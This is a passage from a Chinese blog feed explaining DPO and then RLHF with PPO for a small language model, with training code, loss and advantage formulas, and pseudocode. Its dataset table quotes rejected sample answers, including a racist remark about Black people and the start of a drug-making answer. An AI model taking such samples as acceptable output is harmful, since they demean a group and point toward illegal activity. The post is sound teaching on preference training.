punctuation">(</span>model<span class="token punctuation">)</span><span class="token punctuation">:</span>        logits <span class="token operator">=</span> model<span class="token punctuation">(</span><span class="token operator">**</span>batch<span class="token punctuation">)</span><span class="token punctuation">.</span>logits        log_prob <span class="token operator">=</span> calculate_action_logsoftmax<span class="token punctuation">(</span>logits<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> input_ids<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log_prob <span class="token operator">=</span> filter_mask<span class="token punctuation">(</span>log_prob<span class="token punctuation">,</span> label_mask<span class="token punctuation">)</span>        log_prob_chosen<span class="token punctuation">,</span> log_prob_rejected <span class="token operator">=</span> log_prob<span class="token punctuation">.</span>chunk<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> dim<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>                reward_chosen <span class="token operator">=</span> log_prob_chosen <span class="token operator">-</span> log_prob_ref_chosen        reward_rejected <span class="token operator">=</span> log_prob_rejected <span class="token operator">-</span> log_prob_ref_rejected        loss <span class="token operator">=</span> <span class="token operator">-</span>logsigmoid<span class="token punctuation">(</span>beta <span class="token operator">*</span> <span class="token punctuation">(</span>reward_chosen <span class="token operator">-</span> reward_rejected<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>        accelerator<span class="token punctuation">.</span>backward<span class="token punctuation">(</span>loss<span class="token punctuation">)</span>        <span class="token keyword">if</span> accelerator<span class="token punctuation">.</span>sync_gradients<span class="token punctuation">:</span>            accelerator<span class="token punctuation">.</span>clip_grad_norm_<span class="token punctuation">(</span>lora_parameters<span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span>            optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>            scheduler<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>            optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在每个训练 step 中，执行如下操作：</p><ol><li>计算参考模型 <code>model_ref</code> 的对数概率 <code>log_prob_ref</code>。</li><li>计算待训练模型 <code>model</code> 的 <code>log_prob</code>。</li><li>计算两个 Reward：分别对 <code>chosen</code> 和 <code>rejected</code> 样本计算 <code>reward</code>（即与 reference model 输出对数概率的差值）。</li><li>DPO loss：使用 <code>-logsigmoid(beta * (r_c - r_r))</code> 作为 loss，其中 <code>beta</code> 是温度系数。</li><li>反向传播、梯度裁剪、迭代。</li></ol><h3 id="训练效果"><a href="#训练效果" class="headerlink" title="训练效果"></a>训练效果</h3><p>最初尝试训练时遇到了一些问题：</p><ol><li>一开始学习率设太高了（5e-5），结果模型在训练中后期迅速崩坏，什么都不输出（摆烂是吧？？？）。遂将学习率调至1e-6，问题解决。</li><li>由于我在之前做SFT时的数据量不是很大，如果这里将全部数据（大约10万条）全部用于训练，模型会忘记如何正常回答问题，对于所有问题都一视同仁地拒绝回答（或许边DPO边SFT可以缓解这个问题）。于是，取出25000-30000条数据用于训练即可。</li></ol><p>分别观察Chosen Reward、Rejected Reward以及Loss的趋势：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/ba3ca2b2-3a86-49ff-b0f5-62030232922c.png" style="zoom:50%;" /></p><p>训练过程相比于PPO更加稳定，模型也逐渐能够给出符合我们希望的正向价值观的输出，下面是几个DPO模型与SFT模型的面对诱导性问题和正常问题的回答对比示例：</p><ul><li>诱导性问题：</li></ul><p><img src="https://blogfiles.oss.fyz666.xyz/png/43e0d57a-8205-4bf5-941b-90d0bc6cf360.png" alt=""></p><p><img src="https://blogfiles.oss.fyz666.xyz/png/08c2fe0b-5b64-4e9d-ba10-7b782ac06dbd.png" alt=""></p><ul><li>正常问题</li></ul><p><img src="https://blogfiles.oss.fyz666.xyz/png/975e2a3f-400b-4e03-a9df-feae9379227c.png" alt=""></p><p><img src="https://blogfiles.oss.fyz666.xyz/png/e81257b1-e241-4cf3-b8a7-146aa84ce94e.png" alt=""></p><p>可以看出，DPO 训练后的模型在面对诱导性问题时表现出更强的拒绝能力，而在正常问答中依然能保持良好响应，整体效果令人满意。</p><hr><p>本文涉及的完整代码已整理并开源，详见：</p><a class="tag-Link" target="_blank" href=" https://github.com/windshadow233/tiny-llm-training/">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">tiny-llm-training</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;前面几篇文章已经基本实现了常规RLHF算法训练大模型的流程，从监督微调（SFT）、奖励模型训练（RM）到使用 PPO</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="大语言模型训练" scheme="https://blog.fyz666.xyz/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="机器学习" scheme="https://blog.fyz666.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://blog.fyz666.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
    <category term="PPO 算法" scheme="https://blog.fyz666.xyz/tags/ppo-%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>大语言模型训练原理与实践（五）：RLHF</title>
    <link href="https://blog.fyz666.xyz/blog/12778/"/>
    <id>https://blog.fyz666.xyz/blog/12778/</id>
    <published>2025-07-01T16:07:21.000Z</published>
    <updated>2025-08-14T08:53:41.569Z</updated>
    
    <content type="html"><![CDATA[<p>如前文所述，在经过指令监督微调后，模型已具备初步的指令对齐能力。换言之，它不再只是一个简单的“续写模型”，而能够根据我们提供的指令，生成比较“对题”的响应。为了进一步提升模型的响应质量，以对齐人类偏好，我们还需要用到<strong>基于人类反馈的强化学习（RLHF）</strong>，通过奖励机制引导模型生成更加符合用户意图的回复。</p><p>本篇将结合我自己实现的 RLHF 流程，来介绍 PPO 算法在其中是如何具体应用的。</p><p>其中涉及到的代码均位于此仓库：</p><a class="tag-Link" target="_blank" href=" https://github.com/windshadow233/tiny-llm-training">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">tiny-llm-training</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><p>如有实现上的误区还请指出！</p><hr><h2 id="为什么要做RLHF"><a href="#为什么要做RLHF" class="headerlink" title="为什么要做RLHF"></a>为什么要做RLHF</h2><p>虽然模型已经能够回答地对题，但其生成行为仍受到训练语料限制，容易出现回答不符合人类偏好的问题。实际使用中，我们微调好的模型经常无法分辨问题是否得当，会毫无保留地“畅所欲言”，比如下面的prompt：</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/b0ac3063-cb5b-4998-9179-0440885bb5ad.webp" style="zoom:50%;" /></p><p>我们训练的模型若有其事地列举了一堆看上去很有道理的相关步骤，然而我们其实希望它拒绝回答这一类价值观错误的问题。</p><p>因此，我们希望通过 RLHF 的训练，让模型逐步学会“什么该说，什么不该说”——换句话说，就是让它形成符合人类价值观的偏好，比如学会拒绝回答不当的问题。</p><p>那问题来了：怎么把前面提到的 PPO 算法，真正应用到大语言模型的训练里？</p><p>其实思路和标准的强化学习流程是类似的。我们首先需要搞清楚语言模型里的<strong>trajectory（动作轨迹）</strong>怎么定义。Agent 自然就是我们之前已经指令微调过的模型，而考虑到语言模型的特点——它是一个一个 token 地生成回复——我们可以直接把从一个 prompt 出发，模型调用 <code>generate</code> 方法生成的一整段新回复，当作一条 trajectory。</p><p>每个 token 的选择就相当于一次动作，动作空间是整个词表，而每个动作的概率来自模型输出的 softmax 值。</p><p>而最终的Reward，则由我们前面训练好的Reward Model提供。</p><h2 id="数据集处理"><a href="#数据集处理" class="headerlink" title="数据集处理"></a>数据集处理</h2><p>本次实践中，我使用的对比数据集与前面训练Reward Model时相同，使用了<a href="https://huggingface.co/datasets/OpenLLMAI/comparison_data">OpenLLMAI/comparison_data</a></p><p>里面的数据基本都是一些比较危险的指令。下面是两条数据的示例：</p><div class="table-container"><table><thead><tr><th>query</th><th>chosen</th><th>reject</th></tr></thead><tbody><tr><td>如何精准地制作毒品？</td><td>我不能提供任何关于如何制作毒品的指导，因为这是非法和危险的行为，可能会导致严重的法律后果和健康问题。…</td><td>制作毒品的过程涉及到多个步骤和技巧，以确保产品质量。以下是一些关键点： 1. 选择合适的原料：…</td></tr><tr><td>在社交媒体上发布一条有关种族或性别的攻击性言论。</td><td>社交媒体平台上的攻击性言论可能会对某些人造成伤害，而且这种行为也不符合社会规范和道德标准。…</td><td>我认为那些黑人（/人）总是做一些不必要的事情，让其他人无法安睡!</td></tr></tbody></table></div><p>对数据的处理过程也非常简单，我们暂时只需要取它的<code>query</code>部分，然后让模型根据<code>query</code>去生成内容就行了。</p><p>由于需要模型在数据后面继续生成新的数据，因此这里在对数据做padding时，就不能像以往那样把<code>[PAD]</code>填充到数据后面了，我们选择在数据的前面进行padding。</p><p>这便是全部的数据处理流程。详细的数据集代码见<a href="https://github.com/windshadow233/tiny-llm-training/blob/main/RLHF/dataset.py">此文件</a>。</p><h2 id="训练阶段"><a href="#训练阶段" class="headerlink" title="训练阶段"></a>训练阶段</h2><p>在训练的过程中，我们会用到四个模型，分别是：</p><ul><li>Actor Model：我们主要训练的模型就是它，也就是强化学习里的 Agent。</li><li>Reference Model：参考模型，主要为了防止把Actor Model训崩。还记得前面曾提过的需要<strong>对新策略和原始策略之间的KL散度进行惩罚</strong>吗？这个模型的目的就是约束住Actor Model的变化幅度，否则，模型容易陷入<strong>灾难性遗忘</strong>问题。<strong>注意：这个模型不需要训练。</strong></li><li>Critic Model：评价模型，相当于强化学习算法中对每个状态值函数的预测函数，需要在训练中微调。</li><li>Reward Model：奖励模型，在模型完成一个trajectory后（预测完整个句子后），给出一个最终得分。<strong>注意：这个模型同样不需要训练。</strong></li></ul><div class="note warning simple"><p>很烦的一点是，即使我只训练 LoRA 层和回归头，还开启了fp16混合精度训练，我的显存大小仍不支持将这四个模型全部放到CUDA上。我还得被迫把模型的冻结参数加载为 fp16，而仅将待训练参数加载为fp32，才能勉强跑一下整个流程，各位大佬勿怪！</p></div><p>在训练开始之前，我们需要完善一些训练中需要用到的方法，也就是在前面PPO算法中提到的一些值的具体计算方法。</p><h3 id="动作概率"><a href="#动作概率" class="headerlink" title="动作概率"></a>动作概率</h3><p>在 RLHF 的 PPO 算法中，<strong>动作概率</strong> 指的是语言模型在某个位置生成该 token 的概率。假设通过一个 prompt 生成了一个 response，那么其 <strong>动作序列</strong> <script type="math/tex">\{a_t\mid t=0,\dots,T-1\}</script> 就是新生成的 response token 的序列，而对应的 <strong>策略概率</strong> 可以按如下公式进行计算：</p><script type="math/tex; mode=display">\pi_\theta(a_t \mid x,a_{<t})=\text{softmax}(f_\theta(x,a_{<t}))[a_t]</script><p>上式中：</p><ul><li><script type="math/tex">\pi_\theta</script> 为模型策略。</li><li><script type="math/tex">x</script> 为prompt，<script type="math/tex">a_{<t}</script> 表示生成的前 <script type="math/tex">t-1</script> 个 token的序列，<script type="math/tex">a_t</script> 表示 t 位置生成的token。</li><li><script type="math/tex">f_\theta(x,a_{<t})</script> 表示生成的前<script type="math/tex">t-1</script> 个token序列对应的 logits 值。</li><li><script type="math/tex">[a_t]</script> 表示取出下标为 <script type="math/tex">a_t</script> 处的值，也就是取出对应位置上的概率值。</li></ul><p>计算函数如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">calculate_action_logsoftmax</span><span class="token punctuation">(</span>logits<span class="token punctuation">,</span> chosen_ids<span class="token punctuation">)</span><span class="token punctuation">:</span>    log_probs <span class="token operator">=</span> logits<span class="token punctuation">.</span>log_softmax<span class="token punctuation">(</span>dim<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> log_probs<span class="token punctuation">.</span>gather<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> chosen_ids<span class="token punctuation">.</span>unsqueeze<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>由于<code>generate</code>函数不会返回生成序列的<code>logits</code>值，为了得到这个值，我们需要将生成出来的完整序列重新输入模型，通过<code>forward</code>方法以获取到序列对应的<code>logits</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">logits_old <span class="token operator">=</span> model<span class="token punctuation">(</span>generated_ids<span class="token punctuation">,</span> generated_attention_mask<span class="token punctuation">)</span><span class="token punctuation">.</span>logits<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="K-L散度"><a href="#K-L散度" class="headerlink" title="K-L散度"></a>K-L散度</h3><p><strong>K-L散度</strong>衡量两个概率分布之间的差异程度，在RLHF中被用以稳定训练。实际训练时，计算Reference Model和Actor Model输出分布的K-L散度值，作为奖励惩罚项，也就是不希望K-L散度值太大。</p><p>一种常见实现是直接计算对数概率差：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">kl <span class="token operator">=</span> <span class="token operator">-</span>coeff <span class="token operator">*</span> <span class="token punctuation">(</span>log_prob_old <span class="token operator">-</span> log_prob_ref<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当策略模型生成的动作概率与参考模型相差较大时，则给一个比较大的K-L散度加在Reward上，作为惩罚项，提醒模型冷静更新参数，不要在离谱的道路上越走越远（灾难性遗忘）。</p><p>一般而言，强化学习算法的每个动作都得有个reward作为反馈，但我们的Reward模型仅给整个句子打了一个分，那怎么办呢？</p><p>这里就可以采用这个K-L散度作为每个生成的token（采样动作）的reward，考虑到最后一个token的特殊性，我们将Reward Model给出的值添加到最后一个token对应的K-L散度之上。由此计算得到了每个动作对应的reward。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@torch<span class="token punctuation">.</span>no_grad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calculate_reward_with_kl</span><span class="token punctuation">(</span>end<span class="token punctuation">,</span> log_prob_old<span class="token punctuation">,</span> log_prob_ref<span class="token punctuation">,</span> reward<span class="token punctuation">,</span> coeff<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Calculate the reward with KL divergence penalty.    KL-Reward for each non-eos token with index `idx` is calculated as        -0.1 * (log_prob_old[idx] - log_prob_ref[idx])    For eos token with index `end_pos`, the KL-Reward is calculated as        -0.1 * (log_prob_old[end_pos] - log_prob_ref[end_pos]) + reward.clamp(-5, 5)    """</span>    kl <span class="token operator">=</span> <span class="token operator">-</span>coeff <span class="token operator">*</span> <span class="token punctuation">(</span>log_prob_old <span class="token operator">-</span> log_prob_ref<span class="token punctuation">)</span>    reward_kl <span class="token operator">=</span> kl<span class="token punctuation">.</span>clone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> idx<span class="token punctuation">,</span> end_pos <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> end_pos <span class="token operator">>=</span> reward_kl<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            end_pos <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>        reward_kl<span class="token punctuation">[</span>idx<span class="token punctuation">,</span> end_pos<span class="token punctuation">]</span> <span class="token operator">+=</span> reward<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>clamp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> kl<span class="token punctuation">,</span> reward_kl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="时序差分误差与优势函数"><a href="#时序差分误差与优势函数" class="headerlink" title="时序差分误差与优势函数"></a>时序差分误差与优势函数</h3><p>使用Reward Model中对每个句子计算得到的<code>value</code>向量作为每个动作的状态值的估计。这样，我们可以基于标准的时序差分方法，计算每个位置的 TD 残差：</p><script type="math/tex; mode=display">\delta_t=R_t+\gamma V_{t+1} - V_t</script><p>然后，将prompt部分截去，得到最终的TD残差序列，代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@torch<span class="token punctuation">.</span>no_grad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calculate_td_delta</span><span class="token punctuation">(</span>reward_kl<span class="token punctuation">,</span> value_old<span class="token punctuation">,</span> gamma<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">,</span> prompt_length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    V_s <span class="token operator">=</span> value_old<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    V_next <span class="token operator">=</span> value_old<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    td_delta <span class="token operator">=</span> reward_kl <span class="token operator">+</span> gamma <span class="token operator">*</span> V_next <span class="token operator">-</span> V_s    <span class="token keyword">return</span> td_delta<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> prompt_length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于优势函数的估计方法，已经在<a href="/blog/12706/#%E5%A6%82%E4%BD%95%E4%BC%B0%E8%AE%A1%E4%BC%98%E5%8A%BF%E5%87%BD%E6%95%B0">前面</a>介绍过了，我们可以使用刚刚得到的TD残差序列来估计优势函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@torch<span class="token punctuation">.</span>no_grad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calculate_advantage</span><span class="token punctuation">(</span>td_delta<span class="token punctuation">,</span> lmbda<span class="token operator">=</span><span class="token number">0.95</span><span class="token punctuation">,</span> gamma<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    advantage <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    adv <span class="token operator">=</span> <span class="token number">0.0</span>    <span class="token keyword">for</span> delta <span class="token keyword">in</span> td_delta<span class="token punctuation">.</span>flip<span class="token punctuation">(</span>dims<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>unbind<span class="token punctuation">(</span>dim<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        adv <span class="token operator">=</span> lmbda <span class="token operator">*</span> gamma <span class="token operator">*</span> adv <span class="token operator">+</span> delta        advantage<span class="token punctuation">.</span>append<span class="token punctuation">(</span>adv<span class="token punctuation">)</span>    advantage<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> torch<span class="token punctuation">.</span>stack<span class="token punctuation">(</span>advantage<span class="token punctuation">,</span> dim<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="训练流程"><a href="#训练流程" class="headerlink" title="训练流程"></a>训练流程</h3><p>在有了上面这些基本的函数后，我们就可以运行PPO算法了。下面是用Python语法给出的算法伪代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> batch <span class="token keyword">in</span> dataloader<span class="token punctuation">:</span>    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">### 通过 prompt 生成一些数据</span>        generated_ids <span class="token operator">=</span> model<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>batch<span class="token punctuation">[</span><span class="token string">'input_ids'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> batch<span class="token punctuation">[</span><span class="token string">'attention_mask'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        generated_mask <span class="token operator">=</span> <span class="token punctuation">(</span>generated_ids <span class="token operator">!=</span> pad<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">long</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">### 计算 log_probs_old, log_probs_ref</span>        logits_old <span class="token operator">=</span> model<span class="token punctuation">(</span>generated_ids<span class="token punctuation">,</span> generated_attention_mask<span class="token punctuation">)</span><span class="token punctuation">.</span>logits        logits_ref <span class="token operator">=</span> model_ref<span class="token punctuation">(</span>generated_ids<span class="token punctuation">,</span> generated_attention_mask<span class="token punctuation">)</span><span class="token punctuation">.</span>logits        log_prob_old <span class="token operator">=</span> calculate_action_logsoftmax<span class="token punctuation">(</span>logits_old<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> generated_ids<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log_prob_ref <span class="token operator">=</span> calculate_action_logsoftmax<span class="token punctuation">(</span>logits_ref<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> generated_ids<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment">### 计算 value 和 reward</span>        value_old <span class="token operator">=</span> model_critic<span class="token punctuation">(</span>generated_ids<span class="token punctuation">,</span> attention_mask<span class="token operator">=</span>generated_attention_mask<span class="token punctuation">)</span>        reward <span class="token operator">=</span> model_reward<span class="token punctuation">.</span>get_reward<span class="token punctuation">(</span>generated_ids<span class="token punctuation">,</span> attention_mask<span class="token operator">=</span>generated_attention_mask<span class="token punctuation">)</span>    <span class="token comment">### 计算 kl 散度，并叠加到 reward 上</span>        kl<span class="token punctuation">,</span> reward_kl <span class="token operator">=</span> calculate_reward_with_kl<span class="token punctuation">(</span>log_prob_old<span class="token punctuation">,</span> log_prob_ref<span class="token punctuation">,</span> reward<span class="token punctuation">)</span>        <span class="token comment">### 计算 TD 残差，并估计优势函数</span>        td_delta <span class="token operator">=</span> calculate_td_delta<span class="token punctuation">(</span>reward_kl<span class="token punctuation">,</span> value_old<span class="token punctuation">)</span>        adv <span class="token operator">=</span> calculate_advantage<span class="token punctuation">(</span>td_delta<span class="token punctuation">)</span>    <span class="token comment">### 计算待更新的策略下的动作概率，以及 ratio</span>    logits_new <span class="token operator">=</span> model_actor<span class="token punctuation">(</span>generated_ids<span class="token punctuation">,</span> attention_mask<span class="token operator">=</span>generated_attention_mask<span class="token punctuation">)</span><span class="token punctuation">.</span>logits    log_prob_new <span class="token operator">=</span> calculate_action_logsoftmax<span class="token punctuation">(</span>logits_new<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> generated_ids<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    ratio <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>log_prob_new<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> max_length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">-</span> log_prob_old<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> max_length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                         <span class="token operator">*</span> generated_attention_mask<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> max_length<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">### 计算 actor loss</span>    loss_actor_1 <span class="token operator">=</span> adv <span class="token operator">*</span> ratio    loss_actor_2 <span class="token operator">=</span> adv <span class="token operator">*</span> torch<span class="token punctuation">.</span>clip<span class="token punctuation">(</span>ratio<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">-</span> eps<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> eps<span class="token punctuation">)</span>    loss_actor <span class="token operator">=</span> <span class="token operator">-</span>torch<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span>loss_actor_1<span class="token punctuation">,</span> loss_actor_2<span class="token punctuation">)</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">### 计算 critic loss</span>    value_new <span class="token operator">=</span> model_critic<span class="token punctuation">(</span>generated_ids<span class="token punctuation">,</span> attention_mask<span class="token operator">=</span>generated_attention_mask<span class="token punctuation">)</span>    loss_critic_1 <span class="token operator">=</span> <span class="token punctuation">(</span>value_new<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> max_length<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">-</span> adv <span class="token operator">-</span> value_old<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> max_length<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">**</span> <span class="token number">2</span>    clip_value_new <span class="token operator">=</span> torch<span class="token punctuation">.</span>clip<span class="token punctuation">(</span>value_new<span class="token punctuation">,</span> value_old <span class="token operator">-</span> eps<span class="token punctuation">,</span> value_old <span class="token operator">+</span> eps<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> max_length<span class="token punctuation">:</span><span class="token punctuation">]</span>    loss_critic_2 <span class="token operator">=</span> <span class="token punctuation">(</span>clip_value_new <span class="token operator">-</span> adv <span class="token operator">-</span> value_old<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> max_length<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">**</span> <span class="token number">2</span>    loss_critic <span class="token operator">=</span> torch<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span>loss_critic_1<span class="token punctuation">,</span> loss_critic_2<span class="token punctuation">)</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">### backward &amp; step</span>    <span class="token punctuation">(</span>loss_actor <span class="token operator">+</span> loss_critic<span class="token punctuation">)</span><span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    optimizers<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    